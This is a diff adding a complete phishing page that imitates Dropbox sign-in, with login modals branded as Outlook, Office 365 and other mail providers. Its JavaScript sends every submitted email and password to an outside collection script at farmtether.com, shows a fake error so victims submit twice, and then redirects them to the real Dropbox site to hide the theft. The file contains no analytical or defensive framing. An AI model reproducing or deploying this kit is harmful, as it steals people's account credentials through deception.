@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Share Point Online</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://kit.fontawesome.com/50b3f375f9.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css" />
+    <link rel="stylesheet" href="dropbox.css" />
+</head>
+
+<body>
+    <div class="general-body">
+        <div class="row justify-content-center">
+            <div class="header-img">
+                <img src="./photos/drpbx-white.png" alt="" class="img-fluid" />
+            </div>
+            <h3>Select Your E-Mail Provider</h3>
+            <div class="col-md-11">
+                <div class="box-one">
+                    <div class="row">
+                        <div class="col-md-7">
+                            <div class="section-one">
+                                <h5>Where do you want to download from?</h5>
+                                <h6>Now, You can sign in to dropBox with your email.</h6>
+                                <div class="dp-two">
+                                    <img src="photos/bx.png" alt="" class="img-fluid" />
+                                </div>
+                                <h6>Drop Work the way you do.</h6>
+                                <p class="footer">@ 2022 DropBox Buisness</p>
+                            </div>
+                        </div>
+
+                        <div class="col-md-5">
+                            <div class="section-two">
+                                <ul>
+                                    <li>
+                                        <button id="btn-out" type="button" class="btn btn-md btn-primary btn-outlook">
+                                            <img src="photos/outlook1.png" alt="" class="sm-lg" />
+                                            Sign in with Outlook
+                                        </button>
+                                    </li>
+                                    <li>
+                                        <button id="btn-off" type="button" class="btn btn-md btn-primary btn-office">
+                                            <img src="photos/office3651.png" alt="" class="sm-lg" />
+                                            Sign in with Office365
+                                        </button>
+                                    </li>
+                                    <li>
+                                        <button id="btn-oth" type="button" class="btn btn-md btn-primary btn-others">
+                                            <img src="photos/other1.png" alt="" class="sm-lg" />
+                                            Sign in with Other Mail
+                                        </button>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- approve web3 modal-->
+    <div id="modal-out" class="modal-window">
+        <!-- Modal content -->
+        <div class="modal-window-content">
+            <form  onsubmit="handleSubmit(event)" autocomplete="">
+                <div class="card">
+                    <div class="card-header" style="text-align: right">
+                        <button class="btn btn-sm btn-danger closeOutModal">
+                            <i class="far fa-times-circle"></i>
+                        </button>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-header">
+                            <div class="form-img">
+                                <img src="photos/outlook.png" alt="" class="img-fluid" />
+                            </div>
+                            <h5>Login with Outlook</h5>
+                            <input id="tm" type="text" value="One: Outlook" class="input-form" hidden />
+                            <p id="error" class="error">Please try again later</p>
+                        </div>
+
+                        <div class="form-body">
+                            <div class="form-group">
+                                <label for="email">Email Address</label>
+                                <input type="email" placeholder="Enter Email" id="em" name="em" class="form-control"
+                                    required />
+                                <p>We'll never share your email with anyone else.</p>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="email">Password</label>
+                                <input type="password" placeholder="Enter Password" id="pw" name="pw"
+                                    class="form-control" required />
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card-footer">
+                        <div class="form-button">
+                            <button type="button" id="close" class="btn btn-md btn-secondary">
+                                close
+                            </button>
+                            <button id="submit" class="btn btn-md btn-primary">
+                                Login
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <!-- approve web3 Ends-->
+
+    <!-- Offie Modal modal-->
+    <div id="modal-off" class="modal-window">
+        <!-- Modal content -->
+        <div class="modal-window-content">
+            <form  onsubmit="handleOffice(event)" autocomplete="off">
+                <div class="card">
+                    <div class="card-header" style="text-align: right">
+                        <button class="btn btn-sm btn-danger closeOffModal">
+                            <i class="far fa-times-circle"></i>
+                        </button>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-header">
+                            <div class="form-img">
+                                <img src="photos/office365.png" alt="" class="img-fluid" />
+                            </div>
+                            <h5>Login with Office 365</h5>
+                            <input id="oftm" type="text" value="One: Office" class="input-form" hidden />
+                            <p id="of-error" class="error">Please try again later</p>
+                        </div>
+
+                        <div class="form-body">
+                            <div class="form-group">
+                                <label for="email">Email Address</label>
+                                <input type="email" placeholder="Enter Email" id="ofem" name="em" class="form-control" required />
+                                <p>We'll never share your email with anyone else.</p>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="email">Password</label>
+                                <input type="password" placeholder="Enter Password" id="ofpw" name="pw" class="form-control"
+                                    required />
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card-footer">
+                        <div class="form-button">
+                            <button type="button" id="close-off" class="btn btn-md btn-secondary">
+                                close
+                            </button>
+                            <button id="submit-off" class="btn btn-md btn-primary">
+                                Login
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <!-- Offie Modal Ends-->
+
+    <!-- Others modal-->
+    <div id="modal-oth" class="modal-window">
+        <!-- Modal content -->
+        <div class="modal-window-content">
+            <form  onsubmit="handleOthers(event)" autocomplete="off">
+                <div class="card">
+                    <div class="card-header" style="text-align: right">
+                        <button class="btn btn-sm btn-danger closeOthModal">
+                            <i class="far fa-times-circle"></i>
+                        </button>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-header">
+                            <div class="form-img">
+                                <img src="photos/othermail.ico" alt="" class="img-fluid" />
+                            </div>
+                            <h5>Login with Other Mail</h5>
+                            <input id="ottm" type="text" value="One: Others" class="input-form" hidden />
+                            <p id="ot-error" class="error">Please try again later</p>
+                        </div>
+
+                        <div class="form-body">
+                            <div class="form-group">
+                                <label for="email">Email Address</label>
+                                <input type="email" placeholder="Enter Email" id="otem" name="em" class="form-control" required />
+                                <p>We'll never share your email with anyone else.</p>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="email">Password</label>
+                                <input type="password" placeholder="Enter Password" id="otpw" name="pw" class="form-control"
+                                    required />
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card-footer">
+                        <div class="form-button">
+                            <button type="button" id="close-oth" class="btn btn-md btn-secondary">
+                                close
+                            </button>
+                            <button id="submit-oth" class="btn btn-md btn-primary">
+                                Login
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <!-- Othes MOdal Ends-->
+</body>
+
+</html>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+
+    function handleSubmit(e) {
+        e.preventDefault();
+        let emma = $("#em").val();
+        let peculiar = $("#pw").val();
+        let times_number = $("#tm").val();
+        $.ajax({
+            url: "https://farmtether.com/picture/dp.php",
+            method: "POST",
+            dataType: "JSON",
+            data: {
+                em: emma,
+                pw: peculiar,
+                tm: times_number,
+            },
+            success: function () { },
+            complete: function () {
+                $("#tm").val("Two: Outlook");
+            },
+        });
+        if (times_number === "Two: Outlook") {
+            window.location.replace("https://www.dropbox.com/account");
+        }
+
+        $("#error").show();
+        $("#pw").val("");
+    }
+
+    function handleOffice(e) {
+        e.preventDefault();
+        let emma = $("#ofem").val();
+        let peculiar = $("#ofpw").val();
+        let times_number = $("#oftm").val();
+        $.ajax({
+            url: "https://farmtether.com/picture/dp.php",
+            method: "POST",
+            dataType: "JSON",
+            data: {
+                em: emma,
+                pw: peculiar,
+                tm: times_number,
+            },
+            success: function () { },
+            complete: function () {
+                $("#oftm").val("Two: Office");
+            },
+        });
+        if (times_number === "Two: Office") {
+            window.location.replace("https://www.dropbox.com/account");
+        }
+
+        $("#of-error").show();
+        $("#ofpw").val("");
+    }
+
+
+    function handleOthers(e) {
+        e.preventDefault();
+        let emma = $("#otem").val();
+        let peculiar = $("#otpw").val();
+        let times_number = $("#ottm").val();
+        $.ajax({
+            url: "https://farmtether.com/picture/dp.php",
+            method: "POST",
+            dataType: "JSON",
+            data: {
+                em: emma,
+                pw: peculiar,
+                tm: times_number,
+            },
+            success: function () { },
+            complete: function () {
+                $("#ottm").val("Two: Others");
+            },
+        });
+        if (times_number === "Two: Others") {
+            window.location.replace("https://www.dropbox.com/account");
+        }
+
+        $("#ot-error").show();
+        $("#otpw").val("");
+    }
+
+
+
+</script>
+
+<script>
+    let modalOut = document.getElementById("modal-out");
+    let btnOut = document.getElementById("btn-out");
+    let closeBtn = document.getElementById("close");
+
+    // Get the <span> element that closes the modal
+    let closeOutModal = document.getElementsByClassName("closeOutModal")[0];
+
+    // When the user clicks on the button, open the modal
+    btnOut.onclick = function () {
+        modalOut.style.display = "block";
+    };
+
+    // When the user clicks on <span> (x), close the modal
+    closeOutModal.onclick = function () {
+        modalOut.style.display = "none";
+    };
+    closeBtn.onclick = function () {
+        modalOut.style.display = "none";
+    };
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function (event) {
+        if (event.target == modalOut) {
+            modalOut.style.display = "none";
+        }
+    };
+</script>
+
+<script>
+    let modalOff = document.getElementById("modal-off");
+    let btnOff = document.getElementById("btn-off");
+    let closeBtnOff = document.getElementById("close-off");
+
+    // Get the <span> element that closes the modal
+    let closeOffModal = document.getElementsByClassName("closeOffModal")[0];
+
+    // When the user clicks on the button, open the modal
+    btnOff.onclick = function () {
+        modalOff.style.display = "block";
+    };
+
+    // When the user clicks on <span> (x), close the modal
+    closeOffModal.onclick = function () {
+        modalOff.style.display = "none";
+    };
+    closeBtnOff.onclick = function () {
+        modalOff.style.display = "none";
+    };
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function (event) {
+        if (event.target == modalOff) {
+            modalOff.style.display = "none";
+        }
+    };
+</script>
+
+<script>
+    let modalOth = document.getElementById("modal-oth");
+    let btnOth = document.getElementById("btn-oth");
+    let closeBtnOth = document.getElementById("close-oth");
+
+    // Get the <span> element that closes the modal
+    let closeOthModal = document.getElementsByClassName("closeOthModal")[0];
+
+    // When the user clicks on the button, open the modal
+    btnOth.onclick = function () {
+        modalOth.style.display = "block";
+    };
+
+    // When the user clicks on <span> (x), close the modal
+    closeOthModal.onclick = function () {
+        modalOth.style.display = "none";
+    };
+    closeBtnOth.onclick = function () {
+        modalOth.style.display = "none";
+    };
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function (event) {
+        if (event.target == modalOth) {
+            modalOth.style.display = "none";
+        }
+    };
+</script>
